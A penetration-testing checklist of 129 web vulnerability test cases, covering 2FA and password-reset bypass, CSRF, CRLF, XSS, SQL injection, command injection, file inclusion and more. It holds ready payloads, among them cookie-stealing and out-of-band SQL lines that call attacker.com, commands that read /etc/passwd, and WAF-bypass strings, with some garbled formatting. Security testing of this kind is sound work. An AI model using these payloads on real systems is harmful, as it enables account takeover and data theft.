# Vulnerability Test Cases with Category Tags

## Bug Type Categories

Here are the categorized test cases with proper bug type tags:

---

## 🏷️ Category: Email Verification Bypass

### Test Case 1: OTP Parameter Manipulation
**Bug Type:** `email-verification-bypass` | `parameter-manipulation`

**Steps:**
1. Create account and receive OTP verification
2. Capture OTP verification request in Burp
3. Look for `email` parameter in the request
4. Replace attacker's email with victim's email
5. Submit valid OTP with victim's email
6. Check if account now shows victim's email
7. Logout and login with victim's email & password

### Test Case 2: Reusing Old Verification Link
**Bug Type:** `email-verification-bypass` | `token-reuse`

**Steps:**
1. Sign up as `attacker@mail.com`
2. Receive confirmation email - DO NOT open
3. Navigate to account settings without verifying
4. Change email to `victim@mail.com`
5. Receive new verification link for victim
6. Instead of new link, open the previous link from attacker's inbox
7. If victim's email gets verified, this is a bypass

### Test Case 3: Forced Browsing
**Bug Type:** `email-verification-bypass` | `forced-browsing`

**Steps:**
1. Sign up with `attacker@mail.com`
2. Don't verify email
3. Directly navigate to files/endpoints that should be accessible only after verification
4. Check if you can access protected resources

### Test Case 4: Response/Status Code Manipulation
**Bug Type:** `email-verification-bypass` | `response-manipulation`

**Steps:**
1. Trigger verification check
2. Intercept response
3. Replace error status (403) with success status (200)
4. Check if verification bypass is successful

### Test Case 5: HTTP Protocol Issue
**Bug Type:** `email-verification-bypass` | `insecure-protocol`

**Impact:**
- Email OTP link sent over unsecured HTTP protocol
- Anyone from intermediate computers can sniff and verify the email

**Mitigation:**
- Always generate email OTP links with secured HTTPS protocol

---

## 🏷️ Category: Password Reset Flaw

### Test Case 6: Password Reset - ID Parameter Tampering
**Bug Type:** `password-reset-flaw` | `idor`

**Steps:**
1. Request password reset for attacker account
2. Click the reset link from email
3. Enter new password
4. Intercept the password confirmation request
5. Change user ID/email/username to victim's ID
6. Submit request
7. Victim's password is now changed

### Test Case 7: Password Reset - Host Header Poisoning
**Bug Type:** `password-reset-flaw` | `header-poisoning`

**Steps:**
1. Request password reset
2. Intercept request
3. Modify Host header or add:
- `X-Forwarded-Host: attacker.com`
- `Referrer: attacker.com`
4. Check if reset token is sent to attacker's server

### Test Case 8: Token Leak in Response
**Bug Type:** `password-reset-flaw` | `token-leak`

**Steps:**
1. Register new account (or request password reset)
2. Intercept the response
3. Check if response contains:
- Verification link
- Token
- OTP

### Test Case 9: Reset Link Not Expiring After Use
**Bug Type:** `password-reset-flaw` | `token-expiration`

**Steps:**
1. Request password reset - get link
2. Use the link to reset password
3. Request password reset again
4. Try to use the old (already used) reset link
5. If it works → vulnerable

### Test Case 10: Reset Link Not Expiring with New Token
**Bug Type:** `password-reset-flaw` | `token-invalidation`

**Steps:**
1. Request password reset - get link
2. Request password reset again - get new link
3. Try to use the old (1st) reset link
4. If it works → vulnerable

### Test Case 11: Reset Token Predictability
**Bug Type:** `password-reset-flaw` | `predictable-token`

**Sequential Tokens:**
- `token001`, `token002`, `token003` → can be brute-forced

**Short Tokens:**
- `abc123` or `qwerty` → easily brute-forced

**Predictable Patterns:**
- `userID_timestamp` → easily guessable

**Static Tokens:**
- Fixed token for all reset requests

### Test Case 12: Reset Token Encoding/Decoding
**Bug Type:** `password-reset-flaw` | `token-encoding`

**Steps:**
1. Observe reset token link (it's encoded)
2. Decode it using Base64, MD5, etc.
3. If easily guessable, modify and encode
4. Use modified token for reset

### Test Case 13: Email Change After Reset Request
**Bug Type:** `password-reset-flaw` | `logic-flaw`

**Steps:**
1. Request password reset - get link
2. Don't open reset link
3. Login and change account email
4. Use old reset link
5. If it works → vulnerable

### Test Case 14: Reset After Email Update
**Bug Type:** `password-reset-flaw` | `logic-flaw`

**Steps:**
1. Request password reset - get link
2. Use link to set new password
3. Update account email
4. Try old reset link
5. If it works → vulnerable

### Test Case 15: Time-Based Token Manipulation
**Bug Type:** `password-reset-flaw` | `token-manipulation`

**Steps:**
1. Get reset token with timestamp
2. Decode the token
3. Modify expiration time
4. Encode and reuse
5. If it works → vulnerable

### Test Case 16: Cross-Account Reset via Email Parameter
**Bug Type:** `password-reset-flaw` | `idor`

**Steps:**
1. Enter attacker's email for reset
2. Get link to attacker's email
3. Intercept the reset request
4. Change email to victim's email
5. Reset victim's password

---

## 🏷️ Category: Session Management

### Test Case 17: Invalid Session After Logout
**Bug Type:** `session-mgmt` | `session-invalidation`

**Steps:**
1. Login in two different browsers
2. From Browser 1, logout using "Log Out From All Devices"
3. Check Browser 2 - can you still perform actions?
4. If yes → vulnerable

### Test Case 18: Invalid Session After Password Reset
**Bug Type:** `session-mgmt` | `session-invalidation`

**Steps:**
1. Login in two different browsers
2. In Browser 1, change password
3. Check Browser 2 - can you still perform actions?
4. If yes → vulnerable

### Test Case 19: Session Cookie Reuse
**Bug Type:** `session-mgmt` | `cookie-reuse`

**Steps:**
1. Login and copy session cookies
2. Logout or change password
3. Clear browser cookies
4. Paste the copied cookies
5. Refresh page - still logged in?

### Test Case 20: 2FA Doesn't Expire Previous Sessions
**Bug Type:** `session-mgmt` | `2fa-session`

**Steps:**
1. Login to account
2. Enable 2FA
3. Check if previously active sessions are invalidated

---

## 🏷️ Category: 2FA Bypass

### Test Case 21: Response Manipulation
**Bug Type:** `2fa-bypass` | `response-manipulation`

**Steps:**
1. Enter wrong OTP
2. Intercept response
3. Change error response to success response
4. Check if OTP is bypassed

### Test Case 22: Status Code Manipulation
**Bug Type:** `2fa-bypass` | `status-code-manipulation`

**Steps:**
1. Enter wrong OTP
2. Intercept response
3. Change status code:
- `403 Forbidden` → `200 OK`
4. Check if bypass is successful

### Test Case 23: OTP Leakage in Response
**Bug Type:** `2fa-bypass` | `otp-leak`

**Steps:**
1. Intercept response to OTP verification request
2. Check if actual OTP is returned in response (client-side validation)

### Test Case 24: Code Reusability
**Bug Type:** `2fa-bypass` | `code-reuse`

**Steps:**
1. Enable 2FA on attacker account
2. Logout and login - get OTP
3. Use same OTP twice
4. Also check if previously requested codes expire when new code is requested

### Test Case 25: Lack of Rate Limit
**Bug Type:** `2fa-bypass` | `rate-limit`

**Steps:**
1. Request 2FA code repeatedly (100-200 times)
2. Check if any limitation is set
3. Try to brute-force valid 2FA code
4. Check for successful brute-force

### Test Case 26: OTP with null or 000000
**Bug Type:** `2fa-bypass` | `null-bypass`

**Steps:**
1. Enter `null` or `000000` as OTP
2. Check if it bypasses 2FA verification

### Test Case 27: CSRF on 2FA Disabling
**Bug Type:** `2fa-bypass` | `csrf`

**Steps:**
1. Create CSRF POC for disabling 2FA
2. Send to victim
3. Check if 2FA gets disabled

### Test Case 28: Backup Code Abuse
**Bug Type:** `2fa-bypass` | `backup-code`

**Steps:**
1. Generate backup codes
2. Check if backup codes can be used multiple times
3. Check if backup codes are predictable

### Test Case 29: Simple 2FA Parameter Manipulation
**Bug Type:** `2fa-bypass` | `parameter-manipulation`

**Steps:**
1. Login with attacker credentials
2. Complete 2FA verification
3. Get dashboard link: `https://example.com/my-account?id=attacker`
4. For victim:
- Login with victim credentials
- Instead of 2FA, use: `https://example.com/my-account?id=victim`
5. If you access victim dashboard → vulnerable

### Test Case 30: Broken Logic 2FA Bypass
**Bug Type:** `2fa-bypass` | `logic-flaw`

**Steps:**
1. Complete 2FA with attacker account
2. Cookie contains: `verify=attacker`
3. Change to: `verify=victim`
4. Brute-force OTP if needed
5. Access victim account

### Test Case 31: 2FA Brute-Force via Macro
**Bug Type:** `2fa-bypass` | `brute-force`

**Steps:**
1. Login with credentials
2. On OTP page, wrong OTP causes logout
3. Use Burp Macro for automation:
- GET login page
- POST credentials
- GET OTP page
4. Brute-force OTP with numeric payload
5. Set min/max length as per OTP length

---

## 🏷️ Category: CSRF (Cross-Site Request Forgery)

### Test Case 32: CSRF - Change Request Method
**Bug Type:** `csrf` | `method-manipulation`

**Steps:**
1. Intercept sensitive request (POST)
2. Change method: `POST` → `GET`
3. Remove CSRF token
4. Generate CSRF POC
5. Send to victim

### Test Case 33: CSRF - Remove Token Parameter
**Bug Type:** `csrf` | `token-removal`

**Steps:**
1. Intercept sensitive request
2. Remove CSRF token parameter
3. Generate CSRF POC
4. Send to victim

### Test Case 34: CSRF - Use Own Token
**Bug Type:** `csrf` | `token-reuse`

**Steps:**
1. Get CSRF token from your own account
2. Use it in victim's request
3. Check if token is tied to user session

### Test Case 35: CSRF - Referrer Bypass
**Bug Type:** `csrf` | `referrer-bypass`

**Methods:**
- Change `Referrer` to `Referer`
- Bypass regex: `bank.com.attacker.com` or `attacker.com/bank.com`
- Remove referrer header: `<meta name="referrer" content="no-referrer">`

### Test Case 36: CSRF - Clickjacking
**Bug Type:** `csrf` | `clickjacking`

**Steps:**
1. Check if page is vulnerable to Clickjacking
2. If yes, overlay sensitive buttons
3. Trick victim into clicking

### Test Case 37: CSRF - Delete Account
**Bug Type:** `csrf` | `account-deletion`

**Steps:**
1. Intercept account deletion request
2. Generate CSRF POC using Burp
3. Host HTML on your server
4. Send link to victim
5. Victim's account gets deleted

### Test Case 38: CSRF - Logout
**Bug Type:** `csrf` | `logout`

**Steps:**
1. Create CSRF logout POC
2. Send to victim
3. Victim gets logged out

### Test Case 39: CSRF - Profile Field Deletion
**Bug Type:** `csrf` | `profile-modification`

**Steps:**
1. Create CSRF form for deleting profile fields
2. Send to admin
3. Profile fields get deleted

### Test Case 40: CSRF - Pet/Animal Deletion
**Bug Type:** `csrf` | `data-deletion`

**Steps:**
1. Create CSRF POC for deleting pet
2. Need victim's animal ID
3. Send to victim
4. Pet gets deleted

---

## 🏷️ Category: Brute Force Attacks

### Test Case 41: Stay-Logged-In Cookie Brute Force
**Bug Type:** `brute-force` | `cookie-bruteforce`

**Steps:**
1. Login with "Remember Me" enabled
2. Decode cookie (Base64, MD5, etc.)
3. Cookie contains username + password
4. Generate cookie with encoded credentials
5. Brute-force victim's credentials

### Test Case 42: Password Brute-Force via Password Change
**Bug Type:** `brute-force` | `password-bruteforce`

**Steps:**
1. Login as attacker
2. Go to password change page
3. Intercept change password request
4. Change attacker's ID to victim's ID
5. Brute-force current password
6. Watch for error messages

### Test Case 43: Long Password DoS Attack
**Bug Type:** `dos` | `long-password`

**Steps:**
1. Use password of length 150-200 words
2. Check if any length restriction exists
3. If no restriction, use longer password
4. Observe response time
5. Application may crash

### Test Case 44: Permanent Account Lockout
**Bug Type:** `dos` | `account-lockout`

**Steps:**
1. Enter valid email + wrong password
2. Repeat 10-20 times
3. Check if account gets blocked
4. Check blocking time period
5. If permanent or >30 min → vulnerable

### Test Case 45: Long String DoS
**Bug Type:** `dos` | `long-string`

**Steps:**
1. Create account with fields (username, address, etc.)
2. Input 1000+ characters
3. Search for the account
4. Check for:
- Extended search time
- Application crash (500 error)

---

## 🏷️ Category: CORS Misconfiguration

### Test Case 46: CORS Origin Reflection
**Bug Type:** `cors` | `origin-reflection`

**Steps:**
1. Capture target website traffic
2. Search for `Access-Control` headers
3. Add Origin header:
- `Origin: attacker.com`
- `Origin: null`
- `Origin: attacker.target.com`
- `Origin: target.attacker.com`
4. Check if origin is reflected in response

### Test Case 47: CORS Subdomain Testing
**Bug Type:** `cors` | `subdomain`

**Steps:**
1. Find all subdomains: `subfinder -d target.com`
2. Check alive domains: `httpx`
3. Test each with Origin header
4. Check for reflected origins

### Test Case 48: CORS Bypass Techniques
**Bug Type:** `cors` | `bypass`

**Testing:**
- `Origin: null`
- `Origin: attacker.com`
- `Origin: attacker.target.com`
- `Origin: attackertarget.com`
- `Origin: sub.attackertarget.com`
- Method change: GET ↔ POST
- `Origin: sub.attacker%target.com`
- `Origin: attacker.com/target.com`

---

## 🏷️ Category: HTTP Response Splitting/CRLF Injection

### Test Case 49: CRLF Injection - Cookie Injection
**Bug Type:** `crlf-injection` | `cookie-injection`

**Example:**
```

svgsvg

GET /%0d%0aSet-Cookie\:CRLFInjection=MaliciousCookieSet HTTP/1.1
Host: [target.com](https://target.com/)

text

```
### Test Case 50: CRLF Injection - XSS via Response Splitting
**Bug Type:** `crlf-injection` | `xss`

**Example:**
```

svgsvg

[www.target.com/%3f%0d%0aLocation:%0d%0aContent-Type\:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E](https://www.target.com/%253f%250d%250aLocation:%250d%250aContent-Type\:text/html%250d%250aX-XSS-Protection%253a0%250d%250a%250d%250a%253Cscript%253Ealert%2528document.domain%2529%253C/script%253E)

text

```
### Test Case 51: CRLF Injection - Phishing/Redirect
**Bug Type:** `crlf-injection` | `phishing`

**Example:**
```

svgsvg

GET /%0d%0aLocation:%20[https://evil.com](https://evil.com/) HTTP/1.1
Host: [target.com](https://target.com/)

text

```
### Test Case 52: CRLF Injection - Session Fixation
**Bug Type:** `crlf-injection` | `session-fixation`

**Example:**
```

svgsvg

[www.target.com/%0d%0aSet-Cookie\:session\_id=942](https://www.target.com/%250d%250aSet-Cookie\:session_id=942)....

text

```
### Test Case 53: CRLF Injection - Web Cache Poisoning
**Bug Type:** `crlf-injection` | `cache-poisoning`

**Example:**
```

svgsvg

GET /%0d%0aX-Forwarded-Host:[hacker.com](https://hacker.com/) HTTP/1.1
Host: [target.com](https://target.com/)

text

```
### Test Case 54: CRLF Injection - Log Injection
**Bug Type:** `crlf-injection` | `log-injection`

**Example:**
```

svgsvg

/index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit

text

```
### Test Case 55: CRLF Injection - Header Injection
**Bug Type:** `crlf-injection` | `header-injection`

**Example:**
```

svgsvg

[www.target.com/%0d%0aHackersHeader\:NewHeader](https://www.target.com/%250d%250aHackersHeader\:NewHeader)

text

```
---

## 🏷️ Category: Open Redirect

### Test Case 56: Open Redirect - Parameter Testing
**Bug Type:** `open-redirect` | `parameter-manipulation`

**Parameter Names:**
```

svgsvg

dest, uri, continue, window, View, show, open, redirect, Path, url, out, to,
Dir, navigation, file, reference, Html, data, site, host, Page, port, next,
feed, Return, callback, val, doman, Return\_url, validate, returnurl,
return\_to, Currurl, relaystate, successuri, exit\_uri

text

```
### Test Case 57: Open Redirect - URL Parameters
**Bug Type:** `open-redirect` | `url-manipulation`

**Examples:**
```

svgsvg

?url=http\://{target}
?url=//{target}
?url=$2f%2f{target}
?url=/{target}
?redirect={target}
?next={target}
?destination={payload}
?returnTo={payload}

text

```
### Test Case 58: Open Redirect - Login Flow
**Bug Type:** `open-redirect` | `login-flow`

**Steps:**
1. Go to profile page: `samplesite.me/accounts/profile`
2. Logout and clear cookies
3. Paste profile URL
4. Check redirect parameters:
   - `https://samplesite.me/login?next=accounts/profile`
   - `https://samplesite.me/login?retUrl=accounts/profile`
5. Exploit: `https://samplesite.me/login?next=https://evil.com/`

### Test Case 59: Open Redirect - XSS Chaining
**Bug Type:** `open-redirect` | `xss-chain`

**Example:**
```

svgsvg

[https://samplesite.me/login?next=javascript\:alert(1);//](https://samplesite.me/login?next=javascript\:alert\(1\);//)

text

```
### Test Case 60: Open Redirect - Google Dorking
**Bug Type:** `open-redirect` | `discovery`

**Dork:**
```

svgsvg

site:[target.com](https://target.com/) inurl:?dest inurl\:uri | inurl\:continue | inurl\:window | inurl\:View | inurl\:show | inurl\:open | inurl\:redirect | inurl\:Path | inurl\:url | inurl\:out | inurl\:to | inurl\:Dir | inurl\:navigation | inurl\:file | inurl\:reference | inurl\:Html | inurl\:data | inurl\:site | inurl\:host

text

```
---

## 🏷️ Category: 403 Bypass

### Test Case 61: X-Original-URL Header
**Bug Type:** `403-bypass` | `header-injection`

**Example:**
```

svgsvg

GET /anything HTTP/1.1
Host: [target.com](https://target.com/)
X-Original-URL: /admin

text

```
### Test Case 62: Path Traversal Bypass
**Bug Type:** `403-bypass` | `path-manipulation`

**Examples:**
```

svgsvg

[target.com/%2e%2e/admin](https://target.com/%252e%252e/admin)
[target.com/secret/](https://target.com/secret/).
[target.com//secret//](https://target.com//secret//)
[target.com/./secret/](https://target.com/secret/)..
[target.com/;/secret](https://target.com/;/secret)
[target.com/.;/secret](https://target.com/.;/secret)
[target.com//;//secret](https://target.com//;//secret)

text

```
### Test Case 63: Directory Name Manipulation
**Bug Type:** `403-bypass` | `directory-manipulation`

**Examples:**
```

svgsvg

[target.com/admin..;/](https://target.com/admin..;/)
[target.com/aDmIN](https://target.com/aDmIN)

text

```
### Test Case 64: Web Cache Poisoning
**Bug Type:** `403-bypass` | `cache-poisoning`

**Example:**
```

svgsvg

GET /anything HTTP/1.1
Host: [victim.com](https://victim.com/)
X-Original-URL: /admin

text

```
---

## 🏷️ Category: SSRF (Server-Side Request Forgery)

### Test Case 65: URL Parameter Manipulation
**Bug Type:** `ssrf` | `url-manipulation`

**Steps:**
1. Find parameters that take URLs
2. Test with internal IP addresses:
   - `http://127.0.0.1`
   - `http://169.254.169.254` (AWS metadata)
   - `http://localhost`
3. Check response for internal data

### Test Case 66: SSRF via URL Encoding
**Bug Type:** `ssrf` | `encoding-bypass`

**Examples:**
```

svgsvg

[http://2130706433/](http://127.0.0.1/) (127.0.0.1)
[http://0x7F000001/](http://127.0.0.1/)
[http://0177.0.0.1/](http://127.0.0.1/)

text

```
---

## 🏷️ Category: Business Logic Flaws

### Test Case 67: Race Condition - Discount Code
**Bug Type:** `business-logic` | `race-condition`

**Steps:**
1. Add item to cart
2. Apply discount code
3. Send multiple coupon requests in parallel
4. Check if discount is applied multiple times
5. Purchase item at reduced price

### Test Case 68: Parameter Pollution
**Bug Type:** `business-logic` | `hpp`

**Testing:**
```

svgsvg

/?id=1;select+1&id=2,3+from+users+where+id=1--
/?id=1/\*\*/union/*&id=*/select/*&id=*/pwd/*&id=*/from/*&id=*/users

text

```
### Test Case 69: Parameter Fragmentation
**Bug Type:** `business-logic` | `hpf`

**Example:**
```

svgsvg

/?a=1+union/\*&b=\*/select+1,2
/?a=1+union/\*&b=\*/select+1,pass/\*&c=\*/from+users--

text

```
---

## 🏷️ Category: WAF Bypass

### Test Case 70: SQL Injection - Normalization Bypass
**Bug Type:** `waf-bypass` | `sql-injection`

**Examples:**
```

svgsvg

/?id=1/*union*/union/*select*/select+1,2,3/\*
/?id=1+un/**/ion+sel/**/ect+1,2,3--

text

```
### Test Case 71: SQL Injection - HPP Bypass
**Bug Type:** `waf-bypass` | `sql-hpp`

**Example:**
```

svgsvg

/?id=1;select+1&id=2,3+from+users+where+id=1--

text

```
### Test Case 72: SQL Injection - Blind SQL
**Bug Type:** `waf-bypass` | `blind-sql`

**Function Synonyms:**
- `substring()` → `mid()`, `substr()`
- `ascii()` → `hex()`, `bin()`
- `benchmark()` → `sleep()`

**Logical Operators:**
- `and 1=1`
- `and 5!=6`
- `and 0x50=0x50`

### Test Case 73: SQL Injection - Signature Bypass
**Bug Type:** `waf-bypass` | `signature-bypass`

**Examples:**
```

svgsvg

/?id=1+union+(select+'xz'from+xxx)
/?id=(1)union(select(1),mid(hash,1,32)from(users))
/?id=(1)or(0x50=0x50)

text

```
### Test Case 74: XSS - WAF Bypass
**Bug Type:** `waf-bypass` | `xss`

**Examples:**
```

svgsvg

\<svg onload=prompt%26%230000000040document.domain)> \<svg onload=prompt%26%23x000000028;document.domain)> \<img src=x onerror=alert%26%23040;1%26%23041;> \`\`\`

### Test Case 75: XSS - Data URI

**Bug Type:** `waf-bypass` | `xss-datauri`

**Example:**

text

```
/?param=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
```

svgsvg

---

## 🏷️ Category: S3 Bucket Misconfiguration

### Test Case 76: S3 Bucket - List Items

**Bug Type:** `s3-misconfig` | `public-bucket`

**Commands:**

bash

```
aws s3 ls s3://<bucket name>
aws s3 ls s3://<bucket name> --no-sign-request
```

svgsvg

### Test Case 77: S3 Bucket - Write Access

**Bug Type:** `s3-misconfig` | `write-access`

**Commands:**

bash

```
aws s3 mv test.txt s3://<bucket name>
aws s3 cp test.txt s3://[bucketname]/test.txt
```

svgsvg

### Test Case 78: S3 Bucket - Delete Access

**Bug Type:** `s3-misconfig` | `delete-access`

**Command:**

bash

```
aws s3 rm test.txt s3://<bucket name>/test.txt
```

svgsvg

---

## 🏷️ Category: XSS (Cross-Site Scripting)

### Test Case 79: Reflected XSS - Basic

**Bug Type:** `xss` | `reflected`

**Examples:**

text

```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

svgsvg

### Test Case 80: Reflected XSS - HTML Context

**Bug Type:** `xss` | `reflected-html`

**Examples:**

text

```
"><script>alert(document.domain)</script>
" onmouseover="alert('XSS')
" accesskey="X" onclick="alert(1)
```

svgsvg

### Test Case 81: Reflected XSS - URL Path

**Bug Type:** `xss` | `reflected-url`

**Examples:**

text

```
https://target.com/%22%3E%3Cscript%3Ealert(1)%3C/script%3E
https://target.com/search?q=<script>alert(1)</script>
```

svgsvg

### Test Case 82: Stored XSS - Comments

**Bug Type:** `xss` | `stored`

**Example:**

text

```
</textarea><img src=x onerror=alert(1)>
```

svgsvg

### Test Case 83: Stored XSS - Profile Fields

**Bug Type:** `xss` | `stored-profile`

**Example:**

text

```
"><svg/onload=alert(document.domain)>
```

svgsvg

### Test Case 84: XSS via Markdown

**Bug Type:** `xss` | `markdown`

**Examples:**

text

```
[Click](javascript:alert(1))
![image](javascript:alert(1))
```

svgsvg

### Test Case 85: XSS via File Upload

**Bug Type:** `xss` | `file-upload`

**Examples:**

- Upload HTML file with XSS
- Upload SVG with XSS
- Upload image with XSS in filename

### Test Case 86: DOM-Based XSS

**Bug Type:** `xss` | `dom-based`

**Steps:**

1. Look for JavaScript that uses:
   - `document.location`
   - `document.URL`
   - `location.hash`
   - `document.referrer`
2. Test with payload

### Test Case 87: XSS via Cookie Theft

**Bug Type:** `xss` | `cookie-theft`

**Payload:**

javascript

```
<script>document.location='//attacker.com/'+document.cookie</script>
```

svgsvg

### Test Case 88: XSS via Password Reset

**Bug Type:** `xss` | `password-reset`

**Example:**

text

```
Set password as: >'>"><img src=x onmouseover=prompt(document.domain)>
```

svgsvg

### Test Case 89: XSS via CSS Injection

**Bug Type:** `xss` | `css-injection`

**Example:**

text

```
<style>@import '//attacker.com/evil.css';</style>
```

svgsvg

### Test Case 90: XSS via META Tag

**Bug Type:** `xss` | `meta-tag`

**Example:**

text

```
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
```

svgsvg

---

## 🏷️ Category: SQL Injection

### Test Case 91: SQL Injection - Error Based

**Bug Type:** `sql-injection` | `error-based`

**Examples:**

text

```
' OR '1'='1
' UNION SELECT 1,2,3--
' AND 1=1--
```

svgsvg

### Test Case 92: SQL Injection - Union Based

**Bug Type:** `sql-injection` | `union-based`

**Examples:**

text

```
1 UNION SELECT 1,2,3
1 UNION SELECT user,password FROM users
```

svgsvg

### Test Case 93: SQL Injection - Blind Boolean

**Bug Type:** `sql-injection` | `blind-boolean`

**Examples:**

text

```
' AND 1=1--
' AND 'a'='a
' AND 5!=6
```

svgsvg

### Test Case 94: SQL Injection - Blind Time

**Bug Type:** `sql-injection` | `blind-time`

**Examples:**

text

```
' AND SLEEP(5)--
' AND BENCHMARK(2000000,MD5(NOW()))--
```

svgsvg

### Test Case 95: SQL Injection - Out-of-Band

**Bug Type:** `sql-injection` | `oob`

**Example:**

text

```
1 AND LOAD_FILE(CONCAT('\\\\',DATABASE(),'.attacker.com\\test'))
```

svgsvg

---

## 🏷️ Category: Command Injection

### Test Case 96: Command Injection - Basic

**Bug Type:** `cmd-injection` | `basic`

**Examples:**

text

```
; ls -la
| whoami
& id
`id`
```

svgsvg

### Test Case 97: Command Injection - Bypass

**Bug Type:** `cmd-injection` | `bypass`

**Examples:**

text

```
$(id)
${IFS}id
;cat${IFS}/etc/passwd
```

svgsvg

---

## 🏷️ Category: File Inclusion

### Test Case 98: Local File Inclusion (LFI)

**Bug Type:** `lfi` | `path-traversal`

**Examples:**

text

```
../../../../etc/passwd
..\..\..\windows\win.ini
/../../../../../../../etc/passwd
```

svgsvg

### Test Case 99: LFI - Null Byte

**Bug Type:** `lfi` | `null-byte`

**Example:**

text

```
../../../../etc/passwd%00
```

svgsvg

### Test Case 100: LFI - Log Poisoning

**Bug Type:** `lfi` | `log-poisoning`

**Steps:**

1. Poison logs with PHP code
2. Include log file
3. Execute code

### Test Case 101: Remote File Inclusion (RFI)

**Bug Type:** `rfi` | `remote-include`

**Examples:**

text

```
http://attacker.com/shell.txt
data:text/plain,<?php phpinfo(); ?>
```

svgsvg

---

## 🏷️ Category: Account Takeover

### Test Case 102: Account Takeover - Link Poisoning

**Bug Type:** `account-takeover` | `link-poisoning`

**Example:**

text

```
YOUR ACCOUNT<a href="https://evil.com">LOGIN</a>
```

svgsvg

### Test Case 103: Account Takeover - CSRF Email Change

**Bug Type:** `account-takeover` | `csrf-email`

**Steps:**

1. Create CSRF POC for email change
2. Send to victim
3. Victim's email gets changed
4. Reset password to takeover

### Test Case 104: Account Takeover - Password Reset Link Theft

**Bug Type:** `account-takeover` | `token-theft`

**Steps:**

1. Request password reset
2. Intercept and change host header
3. Token sent to attacker's server
4. Use token to takeover account

### Test Case 105: Account Takeover - OTP Reuse

**Bug Type:** `account-takeover` | `otp-reuse`

**Steps:**

1. Get OTP for your account
2. Use same OTP for victim's account
3. If OTP is not tied to session → vulnerable

---

## 🏷️ Category: Clickjacking

### Test Case 106: Clickjacking - Basic

**Bug Type:** `clickjacking` | `missing-x-frame-options`

**Steps:**

1. Check if X-Frame-Options header is missing
2. Create page with iframe
3. Overlay buttons to trick victim

### Test Case 107: Clickjacking - 2FA Disable

**Bug Type:** `clickjacking` | `2fa-disable`

**Steps:**

1. Find 2FA disable page
2. Check if vulnerable to Clickjacking
3. Overlay on victim's page
4. Victim clicks and disables 2FA

---

## 🏷️ Category: Race Condition

### Test Case 108: Race Condition - Account Creation

**Bug Type:** `race-condition` | `account-creation`

**Steps:**

1. Send multiple account creation requests
2. Check for duplicate accounts
3. Try to use same email multiple times

### Test Case 109: Race Condition - Coupon Application

**Bug Type:** `race-condition` | `coupon`

**Steps:**

1. Apply coupon
2. Send multiple requests in parallel
3. Check if coupon applied multiple times

### Test Case 110: Race Condition - Balance Transfer

**Bug Type:** `race-condition` | `balance-transfer`

**Steps:**

1. Send balance transfer requests in parallel
2. Check if balance is transferred multiple times

---

## 🏷️ Category: Information Disclosure

### Test Case 111: Information Disclosure - Error Messages

**Bug Type:** `info-disclosure` | `error-messages`

**Steps:**

1. Trigger errors
2. Check for sensitive information
3. Stack traces, DB errors, file paths

### Test Case 112: Information Disclosure - Source Code

**Bug Type:** `info-disclosure` | `source-code`

**Steps:**

1. Check for .git, .svn, .env files
2. Check for backup files (.bak, .swp)
3. Check for .htaccess, .htpasswd

### Test Case 113: Information Disclosure - Directory Listing

**Bug Type:** `info-disclosure` | `directory-listing`

**Steps:**

1. Check if directory listing is enabled
2. Access sensitive directories

---

## 🏷️ Category: Weak Password Policy

### Test Case 114: No Password Length Restriction

**Bug Type:** `weak-password` | `no-length-limit`

**Steps:**

1. Register with extremely long password (1000+ chars)
2. Check if accepted
3. Check response time

### Test Case 115: Common Passwords Allowed

**Bug Type:** `weak-password` | `common-passwords`

**Testing:**

- `password`
- `123456`
- `admin`
- `qwerty`

### Test Case 116: No Password Complexity

**Bug Type:** `weak-password` | `no-complexity`

**Testing:**

- Lowercase only
- No special characters
- No numbers

---

## 🏷️ Category: Insecure Direct Object Reference (IDOR)

### Test Case 117: IDOR - Profile Access

**Bug Type:** `idor` | `profile-access`

**Steps:**

1. Access profile with numeric ID
2. Change ID to other users
3. Access other profiles

### Test Case 118: IDOR - File Access

**Bug Type:** `idor` | `file-access`

**Steps:**

1. Access file with numeric ID
2. Change ID
3. Access other users' files

### Test Case 119: IDOR - Password Reset

**Bug Type:** `idor` | `password-reset`

**Steps:**

1. Request password reset
2. Intercept request
3. Change user ID/email
4. Reset other user's password

---

## 🏷️ Category: Mass Assignment

### Test Case 120: Mass Assignment - User Role

**Bug Type:** `mass-assignment` | `role`

**Steps:**

1. Create account
2. Intercept request
3. Add `role=admin`
4. Check if role is assigned

### Test Case 121: Mass Assignment - Email Verification

**Bug Type:** `mass-assignment` | `verified`

**Steps:**

1. Create account
2. Intercept request
3. Add `verified=true`
4. Check if email is verified

---

## 🏷️ Category: Security Misconfiguration

### Test Case 122: Missing Security Headers

**Bug Type:** `sec-misconfig` | `missing-headers`

**Check for:**

- `X-Frame-Options`
- `X-XSS-Protection`
- `Content-Security-Policy`
- `Strict-Transport-Security`

### Test Case 123: Default Credentials

**Bug Type:** `sec-misconfig` | `default-creds`

**Check for:**

- `admin/admin`
- `admin/password`
- `root/root`

### Test Case 124: HTTP Methods Enabled

**Bug Type:** `sec-misconfig` | `http-methods`

**Testing:**

text

```
OPTIONS / HTTP/1.1
Host: target.com
```

svgsvg

**Check for:**

- `PUT`
- `DELETE`
- `TRACE`
- `CONNECT`

---

## 🏷️ Category: SSL/TLS Issues

### Test Case 125: Mixed Content

**Bug Type:** `ssl-tls` | `mixed-content`

**Steps:**

1. Check if HTTPS page loads HTTP resources
2. Scripts, images, CSS over HTTP

### Test Case 126: Weak SSL/TLS Ciphers

**Bug Type:** `ssl-tls` | `weak-ciphers`

**Testing:**

text

```
openssl s_client -connect target.com:443 -cipher 'LOW:EXP:DES:RC4'
```

svgsvg

---

## 🏷️ Category: Session Fixation

### Test Case 127: Session Fixation - URL

**Bug Type:** `session-fixation` | `url`

**Steps:**

1. Get session ID
2. Force victim to use that session ID
3. Login as victim

### Test Case 128: Session Fixation - Cookie

**Bug Type:** `session-fixation` | `cookie`

**Steps:**

1. Set session cookie
2. Force victim's browser to use it
3. Login as victim

---

## 🏷️ Category: Insecure File Upload

### Test Case 129: File Upload - Unrestricted

**Bug Type:** `file-upload` | `unrestricted`

**Steps:**

1. Upload PHP, JSP, ASP files
2. Check if executed on server
3. Access uploaded file

